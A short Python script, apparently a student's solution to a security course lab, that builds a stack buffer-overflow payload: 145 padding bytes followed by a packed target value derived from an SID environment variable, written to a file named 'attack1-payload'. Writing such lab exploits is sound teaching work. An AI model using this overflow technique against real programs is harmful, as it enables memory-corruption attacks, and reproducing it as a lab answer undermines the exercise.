import struct
import os

# Setting the padding size
padding_size = 145

# Fetching the SID environment variable value (my PSU ID - 973212163)
sid =int(os.getenv('SID'),0)

# Target value to wield the wand
target = 0xdeadbaba | sid

#----------------------------
# Creating the payload
#----------------------------
# Adding the padding to the payload
payload = b'A'* padding_size
# Add the target value to wield the wand
payload += struct.pack("<I",target)

# Write payload to the attack1-payload file
with open("attack1-payload", "wb") as f:
        f.write(payload)
